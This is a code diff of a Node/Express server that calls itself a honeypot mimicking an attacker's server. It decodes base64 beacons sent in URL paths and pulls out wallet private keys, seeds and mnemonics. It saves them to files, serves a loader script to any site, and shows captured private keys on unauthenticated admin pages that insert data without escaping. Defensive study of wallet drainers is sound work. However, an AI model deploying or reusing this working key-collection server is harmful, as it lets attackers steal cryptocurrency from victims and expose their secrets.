@@ -1,4 +1,3 @@
-// server.js - Deploy this to Railway
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -13,181 +12,133 @@ if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
 if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });
 
 app.set('trust proxy', true);
-app.use(express.json({ limit: '10mb' }));
 
-// Serve loader.js
-app.get('/loader.js', (req, res) => {
-    logAccess(req, 'LOADER_REQUEST');
-    res.setHeader('Content-Type', 'application/javascript');
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    
-    // Check if loader.js exists, if not send placeholder
-    const loaderPath = path.join(__dirname, 'loader.js');
-    if (fs.existsSync(loaderPath)) {
-        res.sendFile(loaderPath);
-    } else {
-        res.status(404).send('// loader.js not uploaded yet');
+// Get real client IP (handles Railway's proxy)
+function getClientIp(req) {
+    const forwarded = req.headers['x-forwarded-for'];
+    const realIp = req.headers['x-real-ip'];
+    if (forwarded) {
+        return forwarded.split(',')[0].trim();
     }
-});
+    return realIp || req.ip || req.socket.remoteAddress;
+}
 
-// Health check (what the attacker might check)
-app.get('/health', (req, res) => {
-    logAccess(req, 'HEALTH_CHECK');
-    res.json({
-        success: true,
-        msg: "OK",
-        backfil: "https://bloom-sniper-production.up.railway.app"
-    });
-});
-
-// Handle data exfiltration via URL path (GIF beacon)
-app.get('*', (req, res) => {
-    const timestamp = new Date().toISOString();
-    const clientIp = getClientIp(req);
+// Log access with IP
+function logAccess(req, type, extra = {}) {
+    const logEntry = {
+        timestamp: new Date().toISOString(),
+        type: type,
+        ip: getClientIp(req),
+        userAgent: req.headers['user-agent'] || 'none',
+        url: req.originalUrl,
+        referrer: req.headers.referer || 'none',
+        ...extra
+    };
     
-    // Skip admin and static paths
+    const logLine = JSON.stringify(logEntry) + '\n';
+    fs.appendFileSync(path.join(LOGS_FOLDER, 'access.log'), logLine);
+    console.log(`[${type}] ${logEntry.ip} - ${logEntry.url.substring(0, 100)}`);
+}
+
+// Main data collection endpoint - handles the CSS font-face request
+app.get('*', (req, res) => {
+    // Skip admin paths and static files
     if (req.path.startsWith('/admin') || req.path === '/loader.js' || req.path === '/health') {
         return res.status(404).end();
     }
     
-    // Extract base64 from URL path
-    const segments = req.path.split('/').filter(Boolean);
-    let encodedData = segments[segments.length - 1] || '';
-    
-    // URL decode in case characters like +, /, = were encoded
-    try {
-        encodedData = decodeURIComponent(encodedData);
-    } catch(e) {
-        // Already decoded or invalid, continue
-    }
-
-    console.log(`[${timestamp}] Request from: ${clientIp} | Path length: ${encodedData.length}`);
-
-    if (encodedData.length > 40) {
-        try {
-            // Fix padding if needed
-            const padding = 4 - (encodedData.length % 4);
-            if (padding !== 4) {
-                encodedData += '='.repeat(padding);
-            }
-            
-            const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
-            
-            // Debug: log first 500 chars
-            console.log('Decoded preview:', decodedStr.substring(0, 500));
-            
-            let data;
-            try {
-                data = JSON.parse(decodedStr);
-            } catch (parseErr) {
-                // Not JSON, treat as raw string
-                data = { raw: decodedStr };
-            }
-
-            // Extract all possible wallet keys from various formats
-            const extractedKeys = [];
-            
-            // Format 1: data.keys array (your current format)
-            if (data.keys && Array.isArray(data.keys)) {
-                extractedKeys.push(...data.keys);
-            }
-            
-            // Format 2: direct localStorage dump (object with key-value pairs)
-            if (data.localStorage || data.storage) {
-                const storage = data.localStorage || data.storage;
-                for (const [key, value] of Object.entries(storage)) {
-                    if (key.includes('bundle') || key.includes('wallet') || key.includes('key') || key.includes('private')) {
-                        extractedKeys.push({ source: key, value: value, type: 'localStorage' });
-                    }
-                }
-            }
-            
-            // Format 3: specific wallet fields
-            const walletFields = ['eBundle', 'sBundle', 'axiom', 'wallet', 'privateKey', 'seed', 'mnemonic'];
-            for (const field of walletFields) {
-                if (data[field]) {
-                    extractedKeys.push({ source: field, value: data[field], type: 'direct_field' });
-                }
-            }
-
-            const output = {
-                receivedAt: timestamp,
-                ip: clientIp,
-                userAgent: data.header || req.headers['user-agent'],
-                keysCount: extractedKeys.length,
-                keys: extractedKeys,
-                rawData: data, // Keep full raw data for analysis
-                rawSize: decodedStr.length,
-                originalPath: req.path
-            };
-
-            const filename = `stolen_${timestamp.replace(/[:.]/g, '-')}_${clientIp.replace(/[^0-9]/g, '')}.json`;
-            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));
-
-            console.log(`✅ SAVED: ${filename} | Keys: ${output.keysCount}`);
-            
-            // Also log to access log
-            logAccess(req, 'DATA_RECEIVED', { keysCount: output.keysCount, filename });
-            
-        } catch (err) {
-            console.error(`❌ Decode error: ${err.message}`);
-            console.error(`Data was: ${encodedData.substring(0, 100)}...`);
-            logAccess(req, 'DECODE_ERROR', { error: err.message, data: encodedData.substring(0, 100) });
-        }
-    } else {
-        logAccess(req, 'SHORT_REQUEST', { length: encodedData.length });
-    }
-
-    // Return 1x1 GIF
-    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
-    res.setHeader('Content-Type', 'image/gif');
-    res.send(gif);
-});
-
-// POST endpoint (in case attacker uses POST instead of GET)
-app.post('/collect', (req, res) => {
     const timestamp = new Date().toISOString();
     const clientIp = getClientIp(req);
     
-    console.log(`[POST] Data from: ${clientIp}`, req.body);
+    // Extract base64 from URL path (everything after first /)
+    const encodedData = req.path.substring(1); // Remove leading /
     
-    const output = {
-        receivedAt: timestamp,
-        ip: clientIp,
-        userAgent: req.headers['user-agent'],
-        body: req.body,
-        headers: req.headers
-    };
+    console.log(`[DATA] From: ${clientIp} | Length: ${encodedData.length} | Preview: ${encodedData.substring(0, 50)}...`);
     
-    const filename = `post_${timestamp.replace(/[:.]/g, '-')}.json`;
-    fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));
+    if (encodedData.length < 20) {
+        logAccess(req, 'SHORT_REQUEST', { length: encodedData.length });
+        return sendGif(res);
+    }
     
-    logAccess(req, 'POST_DATA', { filename });
+    try {
+        // URL decode first (in case of double encoding)
+        let decodedData = decodeURIComponent(encodedData);
+        
+        // Fix base64 padding
+        const padding = 4 - (decodedData.length % 4);
+        if (padding !== 4) {
+            decodedData += '='.repeat(padding);
+        }
+        
+        // Decode base64
+        const jsonStr = Buffer.from(decodedData, 'base64').toString('utf8');
+        
+        // Parse JSON
+        const data = JSON.parse(jsonStr);
+        
+        // Extract wallet keys
+        const wallets = [];
+        if (data.keys && Array.isArray(data.keys)) {
+            wallets.push(...data.keys);
+        }
+        
+        // Create record
+        const record = {
+            receivedAt: timestamp,
+            attackerIp: clientIp,
+            userAgent: data.header || req.headers['user-agent'],
+            code: data.code,
+            site: data.site,
+            walletCount: data.walletCount || wallets.length,
+            solanaCount: data.solanaCount || 0,
+            evmCount: data.evmCount || 0,
+            wallets: wallets,
+            rawPayload: data
+        };
+        
+        // Save to file
+        const filename = `wallets_${timestamp.replace(/[:.]/g, '-')}_${clientIp.replace(/[^0-9a-zA-Z]/g, '_')}.json`;
+        fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
+        
+        console.log(`✅ SAVED: ${filename} | Wallets: ${wallets.length} | IP: ${clientIp}`);
+        logAccess(req, 'WALLETS_RECEIVED', { 
+            filename, 
+            walletCount: wallets.length,
+            code: data.code 
+        });
+        
+    } catch (err) {
+        console.error(`❌ Error processing data: ${err.message}`);
+        console.error(`Raw data: ${encodedData.substring(0, 200)}`);
+        logAccess(req, 'PROCESS_ERROR', { error: err.message, data: encodedData.substring(0, 100) });
+    }
     
-    res.json({ success: true });
+    // Always return 1x1 GIF (expected by CSS font-face)
+    sendGif(res);
 });
 
-// Helper to get real client IP
-function getClientIp(req) {
-    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-           req.headers['x-real-ip'] || 
-           req.ip || 
-           req.socket.remoteAddress;
+function sendGif(res) {
+    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+    res.setHeader('Content-Type', 'image/gif');
+    res.setHeader('Cache-Control', 'no-store');
+    res.send(gif);
 }
 
-function logAccess(req, type, extra = {}) {
-    const log = {
-        timestamp: new Date().toISOString(),
-        type: type,
-        ip: getClientIp(req),
-        userAgent: req.headers['user-agent'],
-        url: req.originalUrl,
-        ...extra
-    };
-    fs.appendFileSync(path.join(LOGS_FOLDER, 'admin_access.log'), JSON.stringify(log) + '\n');
-}
+// Health check (mimic attacker's server)
+app.get('/health', (req, res) => {
+    logAccess(req, 'HEALTH_CHECK');
+    res.json({ success: true, msg: "OK" });
+});
 
-// HTML Dashboard for viewing logs (easier than JSON)
+// Serve modified loader.js
+app.get('/loader.js', (req, res) => {
+    logAccess(req, 'LOADER_REQUEST');
+    res.setHeader('Content-Type', 'application/javascript');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.sendFile(path.join(__dirname, 'loader.js'));
+});
+
+// HTML Dashboard
 app.get('/admin', (req, res) => {
     logAccess(req, 'ADMIN_DASHBOARD');
     
@@ -195,105 +146,166 @@ app.get('/admin', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Honeypot Dashboard</title>
+        <title>Honeypot - Captured Wallets</title>
         <style>
-            body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
-            .section { margin: 20px 0; border: 1px solid #0f0; padding: 15px; }
-            .log-entry { margin: 5px 0; padding: 5px; background: #222; }
+            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; margin: 0; }
+            h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+            .stats { display: flex; gap: 20px; margin: 20px 0; }
+            .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 150px; }
+            .stat-box h3 { margin: 0 0 10px 0; color: #ff0; }
+            .stat-box .number { font-size: 2em; color: #0f0; }
+            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+            th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
+            th { background: #003300; }
+            tr:hover { background: #001100; }
             .ip { color: #ff0; font-weight: bold; }
-            .key { color: #0ff; }
-            .error { color: #f00; }
+            .wallet { color: #0ff; font-family: monospace; font-size: 0.9em; }
             .timestamp { color: #888; }
-            pre { overflow-x: auto; background: #000; padding: 10px; }
+            .priv-key { color: #f00; background: #330000; padding: 2px 5px; }
+            pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; }
             a { color: #0f0; }
+            .error { color: #f00; }
         </style>
     </head>
     <body>
         <h1>🍯 Honeypot Dashboard</h1>
-        <div class="section">
-            <h2>Access Logs</h2>
-            <div id="logs">Loading...</div>
+        <div class="stats" id="stats">
+            <div class="stat-box">
+                <h3>Total Wallets</h3>
+                <div class="number" id="totalWallets">-</div>
+            </div>
+            <div class="stat-box">
+                <h3>Unique IPs</h3>
+                <div class="number" id="uniqueIps">-</div>
+            </div>
+            <div class="stat-box">
+                <h3>Solana Wallets</h3>
+                <div class="number" id="solanaCount">-</div>
+            </div>
+            <div class="stat-box">
+                <h3>EVM Wallets</h3>
+                <div class="number" id="evmCount">-</div>
+            </div>
         </div>
-        <div class="section">
-            <h2>Stolen Data Files</h2>
-            <div id="files">Loading...</div>
-        </div>
+        
+        <h2>Recent Captures</h2>
+        <table id="capturesTable">
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>Attacker IP</th>
+                    <th>Code</th>
+                    <th>Wallets</th>
+                    <th>Details</th>
+                </tr>
+            </thead>
+            <tbody id="capturesBody">
+                <tr><td colspan="5">Loading...</td></tr>
+            </tbody>
+        </table>
+        
+        <h2>Access Logs</h2>
+        <pre id="accessLogs">Loading...</pre>
+        
         <script>
-            fetch('/admin/logs').then(r => r.json()).then(data => {
-                document.getElementById('logs').innerHTML = data.accessLogs.map(l => 
-                    '<div class="log-entry">' +
-                    '<span class="timestamp">[' + l.timestamp + ']</span> ' +
-                    '<span class="ip">' + l.ip + '</span> ' +
-                    l.type + ' ' + (l.url || '') +
-                    '</div>'
-                ).join('') || 'No logs yet';
-                
-                document.getElementById('files').innerHTML = data.stolenData.map(f => 
-                    '<div class="log-entry">' +
-                    '<b>File:</b> ' + f.filename + '<br>' +
-                    '<b>IP:</b> <span class="ip">' + f.ip + '</span><br>' +
-                    '<b>Keys Found:</b> ' + f.keysCount + '<br>' +
-                    '<b>Time:</b> ' + f.receivedAt + '<br>' +
-                    '<a href="/admin/file?f=' + f.filename + '">View Details</a>' +
-                    '</div>'
-                ).join('') || 'No data received yet';
-            }).catch(e => {
-                document.getElementById('logs').innerHTML = '<span class="error">Error: ' + e.message + '</span>';
-            });
+            async function loadData() {
+                try {
+                    const res = await fetch('/admin/logs');
+                    const data = await res.json();
+                    
+                    // Update stats
+                    document.getElementById('totalWallets').textContent = data.totalWallets || 0;
+                    document.getElementById('uniqueIps').textContent = data.uniqueIps || 0;
+                    document.getElementById('solanaCount').textContent = data.solanaCount || 0;
+                    document.getElementById('evmCount').textContent = data.evmCount || 0;
+                    
+                    // Update captures table
+                    const tbody = document.getElementById('capturesBody');
+                    if (data.captures.length === 0) {
+                        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#888;">No captures yet</td></tr>';
+                    } else {
+                        tbody.innerHTML = data.captures.map(c => 
+                            '<tr>' +
+                            '<td class="timestamp">' + new Date(c.receivedAt).toLocaleString() + '</td>' +
+                            '<td class="ip">' + c.attackerIp + '</td>' +
+                            '<td>' + (c.code || 'N/A') + '</td>' +
+                            '<td>' + c.walletCount + ' (' + c.solanaCount + ' SOL, ' + c.evmCount + ' EVM)</td>' +
+                            '<td><a href="/admin/file?f=' + c.filename + '">View</a></td>' +
+                            '</tr>'
+                        ).join('');
+                    }
+                    
+                    // Update access logs
+                    document.getElementById('accessLogs').textContent = 
+                        data.accessLogs.slice(-50).map(l => 
+                            '[' + l.timestamp + '] ' + l.type + ' from ' + l.ip
+                        ).join('\\n') || 'No logs yet';
+                        
+                } catch (e) {
+                    document.getElementById('capturesBody').innerHTML = 
+                        '<tr><td colspan="5" class="error">Error: ' + e.message + '</td></tr>';
+                }
+            }
+            
+            loadData();
+            setInterval(loadData, 10000); // Refresh every 10 seconds
         </script>
     </body>
     </html>`;
+    
     res.send(html);
 });
 
-// Fixed logs endpoint
+// API endpoint for dashboard data
 app.get('/admin/logs', (req, res) => {
-    logAccess(req, 'ADMIN_LOGS_API');
-    
     try {
-        const logFile = path.join(LOGS_FOLDER, 'admin_access.log');
+        // Read access logs
+        const logFile = path.join(LOGS_FOLDER, 'access.log');
         let accessLogs = [];
-        
         if (fs.existsSync(logFile)) {
             accessLogs = fs.readFileSync(logFile, 'utf8')
                 .split('\n')
                 .filter(Boolean)
                 .map(line => {
-                    try {
-                        return JSON.parse(line);
-                    } catch (e) {
-                        return { raw: line, timestamp: 'unknown' };
-                    }
+                    try { return JSON.parse(line); } 
+                    catch (e) { return { raw: line }; }
                 });
         }
         
-        const stolenFiles = fs.readdirSync(DATA_FOLDER)
-            .filter(f => f.endsWith('.json'))
+        // Read wallet captures
+        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
+        const captures = files
             .map(f => {
                 try {
                     return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                 } catch (e) {
-                    return { filename: f, error: 'Failed to parse' };
+                    return { filename: f, error: true };
                 }
             })
-            .sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt)); // Newest first
+            .sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
+        
+        // Calculate stats
+        const allWallets = captures.flatMap(c => c.wallets || []);
+        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
+        const solanaWallets = allWallets.filter(w => w.type === 'solana').length;
+        const evmWallets = allWallets.filter(w => w.type === 'evm').length;
         
         res.json({
-            accessLogs: accessLogs.slice(-100),  // Last 100 accesses
-            stolenData: stolenFiles,
-            serverTime: new Date().toISOString(),
-            totalFiles: stolenFiles.length,
-            totalRequests: accessLogs.length
+            captures: captures.slice(0, 50), // Last 50
+            accessLogs: accessLogs.slice(-100),
+            totalWallets: allWallets.length,
+            uniqueIps: uniqueIps.length,
+            solanaCount: solanaWallets,
+            evmCount: evmWallets
         });
+        
     } catch (err) {
-        res.status(500).json({ error: err.message, stack: err.stack });
+        res.status(500).json({ error: err.message });
     }
 });
 
-// View specific file
+// View specific capture file
 app.get('/admin/file', (req, res) => {
-    logAccess(req, 'ADMIN_VIEW_FILE', { file: req.query.f });
-    
     try {
         const filename = req.query.f;
         if (!filename || filename.includes('..')) {
@@ -302,38 +314,63 @@ app.get('/admin/file', (req, res) => {
         
         const filePath = path.join(DATA_FOLDER, filename);
         if (!fs.existsSync(filePath)) {
-            return res.status(404).json({ error: 'File not found' });
+            return res.status(404).json({ error: 'Not found' });
         }
         
         const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
-        res.json(data);
+        
+        // Pretty HTML view
+        const html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Capture Details</title>
+            <style>
+                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
+                .section { border: 1px solid #0f0; padding: 15px; margin: 15px 0; }
+                .label { color: #ff0; }
+                .ip { color: #ff0; font-weight: bold; font-size: 1.2em; }
+                .priv { color: #f00; background: #330000; padding: 3px 6px; word-break: break-all; }
+                .pub { color: #0ff; word-break: break-all; }
+                pre { background: #111; padding: 10px; overflow-x: auto; }
+                a { color: #0f0; }
+            </style>
+        </head>
+        <body>
+            <h1>📋 Capture Details</h1>
+            <a href="/admin">← Back to Dashboard</a>
+            
+            <div class="section">
+                <h2>Attacker Information</h2>
+                <p><span class="label">IP Address:</span> <span class="ip">${data.attackerIp || 'Unknown'}</span></p>
+                <p><span class="label">Time:</span> ${data.receivedAt}</p>
+                <p><span class="label">User Agent:</span> ${data.userAgent || 'Unknown'}</p>
+                <p><span class="label">Code:</span> ${data.code || 'N/A'}</p>
+            </div>
+            
+            <div class="section">
+                <h2>Captured Wallets (${data.wallets?.length || 0})</h2>
+                ${(data.wallets || []).map((w, i) => `
+                    <div style="margin: 15px 0; padding: 10px; border: 1px solid #333;">
+                        <p><span class="label">#${i+1} Type:</span> ${w.type || 'unknown'}</p>
+                        <p><span class="label">Public Key:</span> <span class="pub">${w.pub || 'N/A'}</span></p>
+                        <p><span class="label">Private Key:</span> <span class="priv">${w.priv || 'N/A'}</span></p>
+                    </div>
+                `).join('') || '<p>No wallets captured</p>'}
+            </div>
+            
+            <div class="section">
+                <h2>Raw Data</h2>
+                <pre>${JSON.stringify(data, null, 2)}</pre>
+            </div>
+        </body>
+        </html>`;
+        
+        res.send(html);
+        
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
-});
-
-// Download all data as zip (for evidence preservation)
-app.get('/admin/download', (req, res) => {
-    logAccess(req, 'ADMIN_DOWNLOAD');
-    
-    const JSZip = require('jszip');
-    const zip = new JSZip();
-    
-    const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
-    files.forEach(f => {
-        zip.file(f, fs.readFileSync(path.join(DATA_FOLDER, f)));
-    });
-    
-    const logs = fs.readdirSync(LOGS_FOLDER);
-    logs.forEach(f => {
-        zip.file('logs/' + f, fs.readFileSync(path.join(LOGS_FOLDER, f)));
-    });
-    
-    zip.generateNodeStream({ type: 'nodebuffer', streamFiles: true })
-        .pipe(res)
-        .on('finish', () => {
-            console.log('Download complete');
-        });
 });
 
 app.listen(PORT, () => {
